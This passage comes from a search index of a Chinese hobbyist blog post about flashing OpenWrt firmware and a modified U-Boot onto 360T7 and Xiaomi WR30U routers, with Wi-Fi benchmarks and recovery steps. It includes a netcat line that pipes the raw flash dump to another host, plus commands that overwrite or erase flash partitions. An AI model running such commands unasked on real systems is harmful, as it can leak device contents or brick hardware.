br-lan 192.168.1.1 netmask 255.255.255.0 up\nbrctl addif br-lan eth0\n\n# \u8bfb\u53d6/dev/mtd0\uff0c\u4f7f\u7528nc\u53d1\u9001\u5230192.168.1.8:3333\ncat /dev/mtd0 | nc 192.168.1.8 3333\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#3-\u5237\u6539\u7248-uboot-\u5e76\u5237\u56fa\u4ef6","title":"3. \u5237\u6539\u7248 uboot \u5e76\u5237\u56fa\u4ef6","text":"<p>\u6539\u7248 uboot \u529f\u80fd\u8be6\u7ec6\u4ecb\u7ecd\uff1amt798x uboot \u529f\u80fd\u4ecb\u7ecd (hanwckf.top)</p> <ul> <li>\u5982\u679c\u4f7f\u7528\u539f\u7248 uboot\uff0c\u5219\u56fa\u4ef6\u5927\u5c0f\u6700\u591a\u53ea\u80fd\u4f7f\u7528 36MB\uff0c\u6539\u7248\u652f\u6301 108MB</li> <li>\u652f\u6301 webui \u65b9\u4fbf\u5237\u56fa\u4ef6</li> </ul> <p>\u6b65\u9aa4</p> <ul> <li>\u4e0a\u4e00\u6b65\u5f00\u542f telnet \u540e\uff0c\u6b63\u5e38\u91cd\u542f\u7cfb\u7edf</li> <li>telnet \u8fde\u63a5\u8def\u7531\u5668\uff0croot \u7528\u6237\u540d\uff0c\u5bc6\u7801\u4e3a\u4e0a\u4e00\u6b65\u4fee\u6539\u7684\u5bc6\u7801</li> <li>\u672c\u5730 python \u642d\u5efa\u4e00\u4e2a http \u670d\u52a1\uff0c\u8def\u7531\u5668\u4e0a\u901a\u8fc7 wget \u4e0b\u8f7d\u6539\u7248 uboot</li> <li> <p>\u5237\u5199</p> <pre><code>mtd write 360t7-fip-fixed-parts.bin fip\n</code></pre> </li> </ul> <ul> <li>\u6309\u4f4f reset \u952e\uff0c\u63d2\u4e0a\u8def\u7531\u5668\u7535\u6e90\uff0c\u4fdd\u6301 3 \u79d2\u5de6\u53f3\uff0c\u706f\u53d8\u4e3a\u7eff\u8272</li> <li>\u8bbe\u7f6e\u9759\u6001 ip 192.168.1.2\uff0c\u5373\u53ef\u6253\u5f00\u8def\u7531\u5668 web \u754c\u9762\u3002</li> <li>\u9009\u62e9\u56fa\u4ef6\u4e0a\u4f20\u5373\u53ef\uff08\u9700\u8981\u5bf9\u5e94\u6539\u7248 uboot \u5206\u533a\u683c\u5f0f\u7684\uff09</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u6027\u80fd\u95ee\u9898","title":"\u6027\u80fd\u95ee\u9898","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#wifi-\u8dd1\u4e0d\u5230\u5343\u5146","title":"wifi \u8dd1\u4e0d\u5230\u5343\u5146","text":"<p>360t7, QWRT</p> <pre><code>NAME=\"OpenWrt\"\nVERSION=\"SNAPSHOT\"\nID=\"openwrt\"\nID_LIKE=\"lede openwrt\"\nPRETTY_NAME=\"OpenWrt SNAPSHOT\"\nVERSION_ID=\"snapshot\"\nHOME_URL=\"https://openwrt.org/\"\nBUG_URL=\"https://bugs.openwrt.org/\"\nSUPPORT_URL=\"https://forum.openwrt.org/\"\nBUILD_ID=\"r5044-12209a7f2\"\nOPENWRT_BOARD=\"mediatek/mt7981\"\nOPENWRT_ARCH=\"aarch64_cortex-a53\"\nOPENWRT_TAINTS=\"no-all\"\nOPENWRT_DEVICE_MANUFACTURER=\"OpenWrt\"\nOPENWRT_DEVICE_MANUFACTURER_URL=\"https://openwrt.org/\"\nOPENWRT_DEVICE_PRODUCT=\"Generic\"\nOPENWRT_DEVICE_REVISION=\"v0\"\nOPENWRT_RELEASE=\"OpenWrt SNAPSHOT r5044-12209a7f2\"\n\nroot@360T7 \u279c  ~ uname -r\n5.4.243\n</code></pre> <p>\u65e0\u7ebf\u6781\u9650\u901f\u7387</p> <p>cpu \u5360\u7528 150%</p> <pre><code>root@360T7 \u279c  ~ iperf3 -c 192.168.35.135\n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec  1.12 GBytes   962 Mbits/sec  310             sender\n[  5]   0.00-10.00  sec  1.12 GBytes   962 Mbits/sec                  receiver\n\n\nroot@360T7 \u279c  ~ iperf3 -c 192.168.35.135 -P 4\n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec   438 MBytes   368 Mbits/sec  1219             sender\n[  5]   0.00-10.01  sec   438 MBytes   367 Mbits/sec                  receiver\n[  7]   0.00-10.00  sec   278 MBytes   234 Mbits/sec  201             sender\n[  7]   0.00-10.01  sec   278 MBytes   233 Mbits/sec                  receiver\n[  9]   0.00-10.00  sec   174 MBytes   146 Mbits/sec  275             sender\n[  9]   0.00-10.01  sec   174 MBytes   145 Mbits/sec                  receiver\n[ 11]   0.00-10.00  sec   311 MBytes   261 Mbits/sec  1025             sender\n[ 11]   0.00-10.01  sec   311 MBytes   260 Mbits/sec                  receiver\n[SUM]   0.00-10.00  sec  1.17 GBytes  1.01 Gbits/sec  2720             sender\n[SUM]   0.00-10.01  sec  1.17 GBytes  1.01 Gbits/sec                  receiver\n\nroot@360T7 \u279c  ~ iperf3 -c 192.168.35.135 -R\n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate\n[  5]   0.00-10.00  sec   816 MBytes   684 Mbits/sec                  sender\n[  5]   0.00-10.00  sec   815 MBytes   683 Mbits/sec                  receiver\n</code></pre> <pre><code>$ iperf3.exe -B 192.168.35.135 -c 192.168.35.1\n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate\n[  5]   0.00-10.00  sec  1.08 GBytes   930 Mbits/sec                  sender\n[  5]   0.00-10.02  sec  1.08 GBytes   927 Mbits/sec                  receiver\n\n$ iperf3.exe -B 192.168.35.135 -c 192.168.35.1 -R\n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.02  sec  1.05 GBytes   900 Mbits/sec   30             sender\n[  5]   0.00-10.00  sec  1.05 GBytes   900 Mbits/sec                  receiver\n\n$ iperf3.exe -B 192.168.35.135 -c 192.168.35.253\n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate\n[  5]   0.00-10.00  sec   820 MBytes   688 Mbits/sec                  sender\n[  5]   0.00-10.01  sec   820 MBytes   688 Mbits/sec                  receiver\n$ iperf3.exe -B 192.168.35.135 -c 192.168.35.253 -R\n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.01  sec  1.18 GBytes  1.01 Gbits/sec   22             sender\n[  5]   0.00-10.00  sec  1.18 GBytes  1.01 Gbits/sec                  receiver\n\n$ iperf3.exe -B 192.168.35.135 -c 192.168.35.2\n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate\n[  5]   0.00-10.00  sec  1.08 GBytes   924 Mbits/sec                  sender\n[  5]   0.00-10.07  sec  1.08 GBytes   918 Mbits/sec                  receiver\n$ iperf3.exe -B 192.168.35.135 -c 192.168.35.2 -R\n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.05  sec   657 MBytes   548 Mbits/sec   16             sender\n[  5]   0.00-10.00  sec   653 MBytes   548 Mbits/sec                  receiver\n</code></pre>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u56fa\u4ef6\u9009\u62e9","title":"\u56fa\u4ef6\u9009\u62e9","text":"","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#mtwifi-\u95ed\u6e90\u9a71\u52a8","title":"mtwifi \u95ed\u6e90\u9a71\u52a8","text":"<p>\u6069\u5c71 237 \u5927\u4f6c\u56fa\u4ef6</p> <ul> <li>Hanwckf \u7684\u6e90\u7801 +18.06 \u8f6f\u4ef6\u5305</li> <li>\u652f\u6301 802.11 k/v/r \u65e0\u7f1d\u6f2b\u6e38\u3001\u786c\u4ef6 QOS \u7b49\u529f\u80fd</li> <li>\u901a\u8fc7 uboot \u5237\u5165\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u77e5\u4e3a\u4f55\u5237\u5b8c\u91cd\u542f\u540e\u706f\u706d\u4e86\u4e00\u6bb5\u65f6\u95f4\u3002\u521a\u5f00\u59cb\u8fd8\u4ee5\u4e3a\u662f\u8fdb\u4e0d\u4e86\u7cfb\u7edf\uff0c\u4f46\u662f\u540e\u9762\u53d1\u73b0\u6ca1\u95ee\u9898\u7684\u3002</li> <li>\u754c\u9762\u4e3b\u9898\u662f design\uff0c\u786e\u5b9e\u5f88\u597d\u770b</li> <li>\u81f4\u547d\u95ee\u9898\uff1a\u7531\u4e8e\u662f\u81ea\u7f16\u8bd1\uff0c\u65e0\u6cd5\u5b89\u88c5 wireguard</li> <li>\u7b2c\u4e8c\u4e2a\u4e25\u91cd\u95ee\u9898\uff1a\u6ca1\u6709\u4f7f\u7528 wpad\uff0c\u800c\u662f\u4f7f\u7528 luci-app-mtk \u7ba1\u7406\u65e0\u7ebf\uff0c\u8fd9\u5bfc\u81f4\u914d\u7f6e FT \u6ca1\u6cd5</li> </ul> <p></p> <p></p> <p>hanwckf/immortalwrt-mt798x (github.com)</p> <ul> <li>immortalwrt-mt798x \u9879\u76ee\u4ecb\u7ecd (hanwckf.top)</li> </ul> <p>QWRT(lean) \u3010\u65b0\u63d0\u9192\u3011\u6f58\u591a\u62c9 QWRT MT7981 360T7 R23.5.4 \u9ad8\u6027\u80fd\u95ed\u6e90\u56fa\u4ef6\u53d1\u5e03\uff08\u539f\u751f\u65e0\u7ebf\u914d\u7f6e\uff09-OPENWRT \u4e13\u7248 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> <ul> <li>lua \u754c\u9762</li> <li>\u539f\u7248\u65e0\u7ebf\u914d\u7f6e</li> </ul> <p>\u52a0\u7fa4\u540e\uff0c\u7fa4\u4e3b\u544a\u8bc9\u6211\uff0c\u95ed\u6e90\u9a71\u52a8\u53ea\u80fd\u548c\u95ed\u6e90\u9a71\u52a8\u7ec4 mesh\uff0c\u5e76\u4e14\u4e5f\u4e0d\u592a\u652f\u6301 802.11r\u3002</p> <p>ImmortalwrtARM \u3010\u65b0\u63d0\u9192\u3011\u30102023-08-12\u3011\u5c0f\u7c73 WR30U \u95ed\u6e90\u9a71\u52a8 immortalwrt \u56fa\u4ef6 - \u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> <ul> <li>[\u907f\u5751] 360T7 - V2EX \u5728\u8fd9\u91cc\u770b\u5230\u8bf4 padavanonly/immortalwrtARM FT \u6b63\u5e38</li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u4e0d\u786e\u5b9a","title":"\u4e0d\u786e\u5b9a","text":"<p>\u539f\u7248 immortalwrt</p> <ul> <li>\u4f7f\u7528\u4e86\u4e0b\u53d1\u73b0 wan \u53e3\u8bbe\u7f6e dhcp \u521a\u5f00\u59cb\u603b\u6709\u95ee\u9898\uff0c\u867d\u7136\u6700\u540e\u901a\u8fc7\u624b\u52a8\u91cd\u542f dnsmasq \u65b9\u5f0f\u89e3\u51b3\u4e86\uff0c\u4f46\u662f\u786e\u5b9e\u4e0d\u662f\u5f88\u987a\u5229\u3002</li> </ul> <p>\u81ea\u7f16\u8bd1</p> <p>\u5927\u4f6c\u4f60\u597d\u3002\u6211\u8d2d\u4e70\u4e86 360T7 \u548c wr30u \u6765\u5bf9\u5bb6\u4e2d\u7f51\u7edc\u8fdb\u884c\u5347\u7ea7\u3002\u4f46\u662f\u7531\u4e8e\u8fd9\u4e24\u4e2a\u90fd\u6ca1\u6709\u5b98\u65b9 openwrt \u652f\u6301\uff0c\u6211\u7528\u7684\u90fd\u662f\u522b\u4eba\u7f16\u8bd1\u7684\u7248\u672c\u3002 360T7 \u7528\u7684\u662f\u8fd9\u4e2ahanwckf/immortalwrt-mt798x (github.com)\uff0c\u4f46\u662f\u5b83\u7684\u65e0\u9650\u914d\u7f6e\u662f luci-app-mtk\uff0c\u6211\u627e\u4e0d\u5230 802.11r \u7684\u914d\u7f6e\u9009\u9879\u3002 wr30u \u7528\u7684\u662f\u8fd9\u4e2a(QWRT) https://www.right.com.cn/forum/thread-8284824-1-1.html\uff0c\u5b83\u6709 802.11r \u4f46\u662f\u5374\u5565\u90fd\u4e0d\u80fd\u8bbe\u7f6e\uff0c\u6211\u67e5\u770b\u65e5\u5fd7\u770b\u5230 FT \u4f1a\u6709 The PMKID is invalid \u9519\u8bef\u3002\u73b0\u8c61\u5c31\u662f\u8fde\u4e0a\u5b83\u4e4b\u540e\u538b\u6839\u4e0d\u4f1a\u6f2b\u6e38\uff0c\u751a\u81f3\u5f3a\u5ea6\u4f4e\u4e8e -80db \u4e86\u90fd\u4e0d\u4f1a\uff0c\u53ea\u80fd\u624b\u52a8\u65ad\u5f00 wifi \u91cd\u8fde\u3002</p> <p>\u770b\u5230\u4f60\u6d4b\u8bd5\u4e86\u65e0\u7ebf\u5f00\u6e90\u548c\u95ed\u6e90\u7684\u56fa\u4ef6\uff0c\u6211\u60f3\u95ee\u4e0b\u5f00\u6e90\u7684\u56fa\u4ef6\u5728\u90a3\u627e\u3002\u6211\u4e0d\u9700\u8981\u6700\u5f3a\u7684\u6027\u80fd\uff0c\u6211\u53ea\u60f3\u8981\u5b83\u7684\u8bbe\u7f6e\u548c\u5b98\u65b9 openwrt \u4e00\u6837\uff0c\u53ef\u4ee5\u4e00\u8d77\u5de5\u4f5c\u5c31\u884c\u3002\ud83d\ude2d</p> <p>\u6ce8\uff1a\u5bb6\u4e2d\u7f51\u7edc\u539f\u672c\u662f ax6s(\u505a ac\uff09+3 R3g\uff08ap\uff09\uff0c802.11r \u5de5\u4f5c\u5f97\u5f88\u6b63\u5e38\u3002</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5c0f\u7c73-wr30u","title":"\u5c0f\u7c73 WR30U","text":"<p>\u53c2\u8003\u8d44\u6599\uff1a</p> <ul> <li>\u4e00\u4e2a\u6bd4\u8f83\u5e7f\u6cdb\u7684\u6559\u7a0b\uff1a\u5c0f\u7c73 WR30U \u89e3\u9501 SSH \u5237 openwrt\uff0c\u6700\u6709\u6027\u4ef7\u6bd4\u7684\u767e\u5143\u8def\u7531\u5668 (qust.me)</li> <li>\u6062\u590d\u539f\u5382\u56fa\u4ef6\u51e0\u79cd\u65b9\u6cd5\uff1a\u3010\u65b0\u63d0\u9192\u3011\u5c0f\u7c73 WR30U \u6062\u590d\u539f\u5382\u56fa\u4ef6\u7684\u51e0\u79cd\u65b9\u6cd5 - \u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)<ul> <li>hanwckf \u7684\u591a\u5206\u533a uboot\uff0c\u76f4\u63a5\u652f\u6301\u539f\u5382\u3002\u5148\u5237\u5165 uboot\uff0c\u7136\u540e web \u5237\u539f\u5382 mtd8 \u5907\u4efd</li> <li>mtd \u8986\u76d6\u6574\u4e2a mtd0</li> <li>ttl \u4e2d\u65ad uboot\uff0ctftp \u4e0b\u8f7d flash \u5907\u4efd\uff0c\u7136\u540e\u5237</li> </ul> </li> </ul> <p>\u60f3\u4ece QWRT \u5237\u6210\u4e3b\u7ebf openwrt\uff0c\u5237\u4e86 FIP \u5206\u533a\u548c ubi \u5206\u533a\uff08\u5237\u4e86 ubootmod \u548c\u5bf9\u5e94\u56fa\u4ef6\uff09\uff0c\u7ed3\u679c\u628a WR30U \u5237\u574f\u4e86\u3002\u8be6\u7ec6\u89c1 WR30U \u6551\u7816 \u539f\u672c\u7684 QWRT \u5e94\u8be5\u4f7f\u7528\u7684\u662f hanwckf's uboot(immortalwrt-112m)</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5237\u673a","title":"\u5237\u673a","text":"<p>\u4f7f\u7528 hanwckf's \u5927\u4f6c\u63d0\u4f9b\u7684 bl-mt798x uboot \u652f\u6301\u591a\u79cd\u673a\u578b + \u5206\u533a\u683c\u5f0f\uff1amt798x uboot \u529f\u80fd\u4ecb\u7ecd (hanwckf.top)</p> <p>bl-mt798x \u9879\u76ee\u57fa\u4e8e mtk \u539f\u5382\u63d0\u4f9b\u7684 ATF \u53ca uboot \u6e90\u7801\uff0c\u7279\u70b9\u5982\u4e0b</p> <ul> <li>uboot \u81ea\u5e26 mtk \u539f\u5382\u5f00\u53d1\u7684\u7b80\u6613 webui \u6062\u590d\u754c\u9762\uff0c\u53ef\u4ee5\u901a\u8fc7 webui \u76f4\u63a5\u5237\u5165\u56fa\u4ef6\u6216\u8005\u66f4\u65b0 uboot\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e32\u53e3+TFTP \u5237\u5165\u56fa\u4ef6</li> <li>\u652f\u6301\u591a\u79cd Flash \u5206\u533a\u5e03\u5c40\u5207\u6362\u529f\u80fd\uff08\u4ec5\u652f\u6301 spi-nand\uff09\uff0c\u53ef\u4ee5\u5728 webui \u4e2d\u5207\u6362\u4e0d\u540c\u7684\u5206\u533a\u5e03\u5c40\uff0c\u5b8c\u7f8e\u517c\u5bb9\u5c0f\u7c73\u539f\u5382\u56fa\u4ef6</li> </ul> <p>hanwckf \u7684 uboot \u652f\u6301\u591a\u79cd dts \u5e03\u5c40\uff0c\u53ef\u4ee5\u5f15\u5bfc\u4e0d\u540c\u7684\u56fa\u4ef6\uff08\u5305\u542b\u5b98\u65b9\u56fa\u4ef6\uff09\u3002\u4f46\u662f\u9700\u6ce8\u610f</p> <ul> <li>uboot \u652f\u6301\u5237\u5165\u5c0f\u7c73\u539f\u5382 mtd8/mtd9 \u5907\u4efd\u6587\u4ef6\uff08\u53ef\u4ece\u6b64\u5904\u4e0b\u8f7d\uff09\uff0c\u4e0d\u652f\u6301<code>miwifi.com</code>\u5b98\u7f51\u4e0b\u8f7d\u7684\u56fa\u4ef6</li> <li>\u7531\u4e8e OpenWrt \u4e3b\u7ebf\u7684 ubootmod \u56fa\u4ef6\u672a\u5f00\u542f nmbm \u652f\u6301\uff0c\u56e0\u6b64\u4e0d\u652f\u6301\u4efb\u4f55 ubootmod \u5206\u533a\u5e03\u5c40\u7684\u4e3b\u7ebf\u56fa\u4ef6\uff08\u5305\u62ec OpenWrt, X-Wrt \u7b49\u5e26\u6709 ubootmod \u5b57\u6837\u7684\u56fa\u4ef6\uff09\uff0c\u8bf7\u4f7f\u7528 OpenWrt \u4e3b\u7ebf\u63d0\u4f9b\u7684 uboot \u542f\u52a8 ubootmod \u56fa\u4ef6</li> </ul> \u56fa\u4ef6\u7c7b\u578b uboot (default) uboot (immortalwrt-112m) uboot (qwrt) \u5c0f\u7c73\u539f\u5382 mtd8/mtd9 \u5907\u4efd\u6587\u4ef6 \u221a \u00d7 \u00d7 immortalwrt-mt798x stock \u221a \u00d7 \u00d7 OpenWrt stock \u221a \u00d7 \u00d7 immortalwrt stock \u221a \u00d7 \u00d7 X-Wrt stock \u221a \u00d7 \u00d7 immortalwrt-mt798x 112m \u00d7 \u221a \u00d7 GL.iNet by 237176253 \u00d7 \u221a \u00d7 X-Wrt 112m nmbm \u00d7 \u221a \u00d7 OpenWrt 112m nmbm \u00d7 \u221a \u00d7 immortalwrt 112m nmbm \u00d7 \u221a \u00d7 X-Wrt 112m nmbm \u00d7 \u221a \u00d7 QWRT \u00d7 \u00d7 \u221a OpenWrt ubootmod \u00d7 \u00d7 \u00d7 immortalwrt ubootmod \u00d7 \u00d7 \u00d7 X-Wrt ubootmod \u00d7 \u00d7 \u00d7","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u56fa\u4ef6","title":"\u56fa\u4ef6","text":"<p>\u4ee5\u4e0b\u56fa\u4ef6\u5747\u4f7f\u7528\u95ed\u6e90\u65e0\u7ebf\u9a71\u52a8\uff0c\u65e0\u6cd5\u548c\u5b98\u65b9 openwrt \u7ec4 mesh QWRT \u3010\u65b0\u63d0\u9192\u3011\u6f58\u591a\u62c9 QWRT MT7981 \u5c0f\u7c73 WR30U \u8054\u901a\u7248 \u9ad8\u6027\u80fd\u95ed\u6e90\u56fa\u4ef6\u53d1\u5e03\uff08\u539f\u751f\u65e0\u7ebf\u914d\u7f6e\uff09-OPENWRT \u4e13\u7248 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> <p>X-Wrt X-Wrt, for IoT, a custom Distribution for OpenWrt</p> <p>hanwckf's immortalwrt hanwckf/immortalwrt-mt798x (github.com) immortalwrt-mt798x \u9879\u76ee\u4ecb\u7ecd (hanwckf.top)</p>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5b98\u65b9\u6559\u7a0b","title":"\u5b98\u65b9\u6559\u7a0b","text":"<p>\u5b98\u65b9\u6559\u7a0bgit.openwrt.org Git - openwrt/openwrt.git/commit</p> <p>stock \u56fa\u4ef6 uboot</p> <ul> <li>\u539f\u5382\u89e3\u9501 ssh</li> <li>\u5237 initramfs-factory.ubi (ubiformat)</li> <li>\u4f7f\u7528 squashfs-sysupgrade.bin \u5347\u7ea7\uff08\u547d\u4ee4\u884c sysupgrade \u6216\u8005 luci\uff09 stock uboot \u5206\u533a\u5e03\u5c40\uff0cubi \u90e8\u5206\u5f88\u5c0f\uff0c\u53ea\u6709 34MB(128MB flash)</li> </ul> <p>\u6539\u7248 uboot \u53ef\u4ee5\u4f7f\u7528\u6539\u7248 uboot \u5206\u533a\u683c\u5f0f\uff08\u4e0d\u662f\u4f7f\u7528\u6539\u7248 bootloader\uff0c\u6bd4\u5982 breed\u3002\u800c\u4e14\u795e\u5947\u7684\u662f uboot \u5c45\u7136\u4e5f\u652f\u6301\u7f51\u9875\u4e0a\u4f20\u56fa\u4ef6\u529f\u80fd\uff09</p> <ul> <li>\u5237 ubootmod-initramfs-factory.ubi</li> <li>kmod-mtd-rw</li> <li>Format\u00a0ubi\u00a0and\u00a0create\u00a0new\u00a0ubootenv\u00a0volume</li> </ul> <pre><code>ubidetach\u00a0-p\u00a0/dev/mtd8;\u00a0ubiformat\u00a0/dev/mtd8\u00a0-y;\u00a0ubiattach\u00a0-p\u00a0/dev/mtd8  \n\u00a0\u00a0\u00a0ubimkvol\u00a0/dev/ubi0\u00a0-n\u00a00\u00a0-N\u00a0ubootenv\u00a0-s\u00a0128KiB  \n\u00a0\u00a0\u00a0ubimkvol\u00a0/dev/ubi0\u00a0-n\u00a01\u00a0-N\u00a0ubootenv2\u00a0-s\u00a0128KiB\n</code></pre> <ul> <li>Flash\u00a0Openwrt\u00a0U-Boot<ul> <li>BL2 \u662f ARM \u8bbe\u5907\u5173\u4e8e\u591a\u7ea7 Bootloader \u4e2d\u7684\u4e00\u7ea7\u3002</li> <li>FIP \u5305\u542b uboot</li> </ul> </li> </ul> <pre><code>mtd\u00a0write\u00a0/tmp/ubootmod-preloader.bin\u00a0BL2  \n mtd\u00a0write\u00a0/tmp/ubootmod-bl31-uboot.fip\u00a0FIP\n</code></pre> <ul> <li>sysupgrade</li> </ul> <p>\u6062\u590d\u539f\u5382\u56fa\u4ef6</p> <ul> <li>sysupgrade\u00a0-F\u00a0-n\u00a0/tmp/ubootmod-initramfs-recovery.itb\u3002\u7cfb\u7edf\u4f1a\u91cd\u542f\u8fdb\u5165 openwrt initramfs \u7cfb\u7edf</li> <li>Format\u00a0ubi\u00a0and\u00a0Nvram <code>ubidetach\u00a0-p\u00a0/dev/mtd8;\u00a0ubiformat\u00a0/dev/mtd8\u00a0-y;\u00a0ubiattach\u00a0-p\u00a0/dev/mtd8   \u00a0\u00a0\u00a0mtd\u00a0erase\u00a0Nvram</code> \u00a0\u00a0\u00a0- Flash\u00a0stock\u00a0U-Boot\u00a0and\u00a0ubi <code>mtd\u00a0write\u00a0/tmp/BL2.bin\u00a0BL2   \u00a0\u00a0\u00a0mtd\u00a0write\u00a0/tmp/FIP.bin\u00a0FIP   \u00a0\u00a0\u00a0mtd\u00a0write\u00a0/tmp/ubi.bin\u00a0ubi</code></li> <li>\u5237\u56de\u5907\u4efd mtd8\uff08\u539f\u5382\u56fa\u4ef6\uff09 \u00a0\u00a0\u00a0Just\u00a0run\u00a0command:\u00a0<code>ubiformat\u00a0/dev/mtd8\u00a0-y\u00a0-f\u00a0/tmp/ubi.bin</code></li> </ul>","tags":["openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5176\u5b83-7981","title":"\u5176\u5b83 7981","text":"<p>\u505a\u5de5\u679c\u7136\u8fd8\u662f\u6709\u533a\u522b\u7684\uff0cax6s wifi6 160Mhz \u6781\u9650\u53ef\u4ee5\u8dd1\u52301.56Gbits/sec\u3002\u800c jcg q30 pro \u6700\u9ad8\u8dd1\u5230 1.2G\u3002</p> <p>\u65e0\u7ebf\u89c4\u683c\u662f ax3000\uff0c\u652f\u6301 160Mhz \u9891\u5bbd\u7684 Wi-Fi\uff0c\u76f8\u6bd4\u7ea2\u7c73 ax6s \u7684 4x4mimo 80Mhz \u9891\u5bbd\uff0c\u76ee\u524d 2*2 mimo 160Mhz \u8fd8\u662f\u66f4\u5b9e\u7528\uff0c\u80fd\u8ba9\u8fd1\u51e0\u5e74\u7684\u5b89\u5353\u3001Windows \u8bbe\u5907\u90fd\u80fd\u8fbe\u5230 2400Mbps \u7684\u8fde\u63a5\u901f\u7387\uff1b</p> <p>ax6s \u6211\u6210\u529f\u5f00\u542f\u4e86 160Mhz\uff0c\u867d\u7136\u5f00\u59cb\u786e\u5b9e\u9047\u5230\u4e86\u5f00\u542f\u540e\uff0c\u6ca1\u6709 wifi \u4fe1\u53f7\u7684\u95ee\u9898\u3002\u4f46\u662f\u8bd5\u4e86\uff1a\u56fd\u5bb6\u7801\u6539\u6210 AU\uff0c60 channel \u540e\u5c31\u6210\u529f\u4e86\uff0836 \u8bd5\u4e86\u5f00\u4e0d\u5f00\uff09\u3002\u5728 wifi analyzer \u548c wifi man \u624b\u673a\u8f6f\u4ef6\u4e2d\u770b\u786e\u5b9e\u662f 60 \u5f00\u59cb\u7684 80 Mhz\u3002\u4f46\u662f\u7b14\u8bb0\u672c\u8fde\u63a5\u786e\u5b9e\u80fd\u534f\u5546\u5230 2400\uff0c\u5e76\u4e14 iperf3 \u6d4b\u901f\u4e0a\u4f20\u4e5f\u80fd\u5230 1.5G\u3002</p> <pre><code>$ iperf3.exe -c ax6s.op2 -P 2\n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate\n[  5]   0.00-10.00  sec   949 MBytes   796 Mbits/sec                  sender\n[  5]   0.00-10.01  sec   949 MBytes   796 Mbits/sec                  receiver\n[  7]   0.00-10.00  sec   911 MBytes   764 Mbits/sec                  sender\n[  7]   0.00-10.01  sec   911 MBytes   764 Mbits/sec                  receiver\n[SUM]   0.00-10.00  sec  1.82 GBytes  1.56 Gbits/sec                  sender\n[SUM]   0.00-10.01  sec  1.82 GBytes  1.56 Gbits/sec                  receiver\n</code></pre> <p>\u4e3b\u7ebfop\uff1aOpenWrt Firmware Selector 